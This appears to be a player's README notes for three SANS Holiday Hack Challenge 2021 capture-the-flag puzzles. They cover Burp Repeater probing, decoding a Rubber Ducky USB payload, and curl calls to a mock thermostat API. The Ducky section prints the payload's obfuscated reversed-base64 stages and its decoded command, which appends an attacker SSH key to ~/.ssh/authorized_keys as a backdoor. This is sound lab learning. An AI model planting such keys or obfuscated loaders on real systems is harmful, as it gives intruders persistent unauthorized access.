# HolidayHackChallenge2021
**<p align="center">**
![image](https://user-images.githubusercontent.com/33500545/148440994-34860215-6845-493c-b5b1-a9d237360875.png)
</p>
<p align="center">
Notes from 2021 HolidayHackChallenge
</p>




# Now Hiring
You are directed to apply for a job over at https://apply.jackfrosttower.com/
So first thing is to check the site out, when you click on Opportunities you will notice that the images do not load.  There are 4 images (1.jpg, 2.jpg,3.jpg,4.jpg).
So I decided to run this through burp as the images aren’t valid it seems.

I enabled my proxy and went to apply.jackfrosttower.com/images and that resulted in a ngix error, I then sent that request to repeater, and in repeater i tried 1.jpg, with no result.  Then i tried 2.jpg and found the super secret key.
No WIN
![image](https://user-images.githubusercontent.com/33500545/148627937-e53e60be-4605-48fd-bc20-01a8a781c8cc.png)
WIN
![image](https://user-images.githubusercontent.com/33500545/148627923-aa7de3c7-2f85-4439-83f7-bc1c762baa12.png)

# Strange USB Device

Ducky-decode.pl inject.bat
Echo ‘==gCzlXZr9FZlpXay9Ga0VXYvg2cz5yL+BiP+AyJt92YuIXZ39Gd0N3byZ2ajFmau4WdmxGbvJHdAB3bvd2Ytl3ajlGILFESV1mWVN2SChVYTp1VhNlRyQ1UkdFZopkbS1EbHpFSwdlVRJlRVNFdwM2SGVEZnRTaihmVXJ2ZRhVWvJFSJBTOtJ2ZV12YuVlMkd2dTVGb0dUSJ5UMVdGNXl1ZrhkYzZ0ValnQDRmd1cUS6x2RJpHbHFWVClHZOpVVTpnWwQFdSdEVIJlRS9GZyoVcKJTVzwWMkBDcWFGdW1GZvJFSTJHZIdlWKhkU14UbVBSYzJXLoN3cnAyboNWZ’ | rev

Echo 
'ZWNobyAnc3NoLXJzYSBVbU41UkhKWldIZHJTSFJvZG1WdGFWcDBkMWwzVTJKcVoyZG9SRlJIVEdSdFQwWnpTVVpOZHlCVWFHbHpJR2x6SUc1dmRDQnlaV0ZzYkhrZ1lXNGdVMU5JSUd0bGVTd2dkMlVuY21VZ2JtOTBJSFJvWVhRZ2JXVmhiaTRnZEVGS2MwdFNVRlJRVldwSFpHbE1SbkpoZFdkU1QyRlNhV1pTYVhCS2NVWm1VSEFLIGlja3ltY2dvb3BAdHJvbGxmdW4uamFja2Zyb3N0dG93ZXIuY29tJyA+PiB+Ly5zc2gvYXV0aG9yaXplZF9rZXlzCg==' | base64 -d

echo 'ssh-rsa UmN5RHJZWHdrSHRodmVtaVp0d1l3U2JqZ2doRFRHTGRtT0ZzSUZNdyBUaGlzIGlzIG5vdCByZWFsbHkgYW4gU1NIIGtleSwgd2UncmUgbm90IHRoYXQgbWVhbi4gdEFKc0tSUFRQVWpHZGlMRnJhdWdST2FSaWZSaXBKcUZmUHAK ickymcgoop@trollfun.jackfrosttower.com' >> ~/.ssh/authorized_keys

# Frost Ice Melt Castle
```
Iwlist wlan0 scanning
Iwconfig wlan0 essid FROST-Nidus-Setup
“* New network connection to Nidus Thermostat detected! Visit http://nidus-setup:8080/ to complete setup”
Curl http://ndius-setup:8080/
```
Need to adjust the api: 
```http://nidus-setup:8080/apidoc
elf@85f15cd56977
```
Run this twice: 
```
curl -XPOST -H 'Content-Type: application/json' \
  --data-binary '{"temperature": -0}' \
  http://nidus-setup:8080/api/cooler
```
![image](https://user-images.githubusercontent.com/33500545/148628021-70fd4605-b318-4324-b059-d267c73c91d9.png)
